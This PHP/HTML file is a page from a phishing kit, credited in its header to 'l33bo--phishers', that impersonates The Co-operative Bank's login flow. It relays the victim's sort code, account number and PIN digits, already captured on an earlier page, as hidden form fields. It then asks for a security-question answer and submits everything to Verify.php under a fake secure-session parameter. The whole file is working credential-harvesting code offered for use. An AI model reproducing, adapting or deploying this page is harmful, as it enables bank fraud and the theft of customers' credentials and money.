<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

$sort = $_POST['sort'];
$acno = $_POST['acno'];
$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
?>
<!DOCTYPE html>
<html>
<head>
    <title>Enter your memorable information</title>
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="user-scalable=yes, width=device-width, initial-scale=1" name="viewport">
    
<link rel="stylesheet" href="assets/css/login.css" type="text/css">
<link rel="stylesheet" href="assets/css/custom.css" type="text/css">
<meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Pragma-directive" content="no-cache">
<meta http-equiv="pragma" content="no-cache"><!--Stops ipads and iphones automatically rendering phone numbers as links -->
<meta name="format-detection" content="telephone=no">

    
</head>
<body>
    
    <div id="coopHeader">
	      


     <div id="coopHeader">
        <div class="headIntro contain">
            <h1>The Co-operative bank</h1>
            <div class="accDetails">
                <strong>
	            
				</strong>   
            </div>
        </div>
    </div>


	      






<div id="loginSubHeader">
    <h2 class="loginSubHeader">Enter your memorable information</h2>
</div>


    </div>
    <table cellpadding="0" cellspacing="0" width="100%">
    	<tbody><tr>
        <td height="70%">






<form name="login" id="login" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="OFF">
<input type="hidden" name="sort" value="<? echo $sort ?>"> 
<input type="hidden" name="acno" value="<? echo $acno ?>"> 
<input type="hidden" name="pin1" value="<? echo $pin1 ?>"> 
<input type="hidden" name="pin2" value="<? echo $pin2 ?>"> 
<input type="hidden" name="pin3" value="<? echo $pin3 ?>"> 
<input type="hidden" name="pin4" value="<? echo $pin4 ?>"> 

<div id="logonBody">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr>
        <td colspan="2" align="left">
          <table border="0" width="100%">
            <tbody><tr>
              <td class="verttop" align="left"><br>
                <a href="#"><img src="assets/img/back.gif" border="0"></a>
              </td>
            </tr>
          </tbody></table>
        </td>  
    </tr>
    <tr>
        <td colspan="2" align="left">
          <table border="0" width="90%">
            <tbody><tr>
                <td class="verttop" align="left"><br>			Finally, enter 
your memorable information.  Remember, your memorable information works 
like a password - it must be entered in exactly the same format each 
time including any spaces or capital letters.		</td>
            </tr>
          </tbody></table>
        </td>    
    </tr>
    <tr><td width="20%"><br></td><td></td></tr>
	

	
    <tr>
        <td class="label">          Sort code &nbsp;      </td>
        <td class="field"><? echo $sort ?></td>
    </tr>
    <tr>
        <td><br>
        </td>
    </tr>
    <tr>
        <td class="label">          Account number &nbsp;      </td>
        <td class="field"><? echo $acno ?></td>
    </tr>
    <tr>
        <td><br>
        </td>
    </tr>
	

	
    
	    
    <tr>
        <td class="label"><label for="lastschool">          <strong>last</strong> school attended &nbsp;      </label></td>
        <td class="field"><input name="lastschool" maxlength="18" size="18" value="" id="lastschool" type="password"></td>
    </tr>
        

	
    
	        
    
	

    <tr>
        <td></td><td id="scerror" class="error"></td>
    </tr>   
		    
    <tr>
        <td><br></td>
    </tr>
	<tr>
		<td class="label">&nbsp;
		</td>
		<td class="forgotSecurity"><a href="/" title="forgot">Forgotten your security details?</a></td>
	</tr>
		    
    <tr>
        <td><br><br></td>
    </tr>
</tbody></table>
</div>
<div id="logonButton">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr>
        <td></td>
        <td colspan="2" align="right"><a href="#" id="confirmBtn" type="submit" value="" onclick="validLogin()"></a></td>
    </tr>
</tbody></table>
</div>
</form>
</td>
    	</tr>
    	<tr>
        <td height="10%"></td>
    	</tr>	
	</tbody></table>	
<script>
function validLogin() {
    var x = document.forms["login"]["lastschool"].value;
	if (x == null || x == "") {
		document.getElementById("scerror").innerHTML = "*** Please enter security question answer. *** ";
        return false;
    }
document.login.submit();
}
</script>		

</body></html>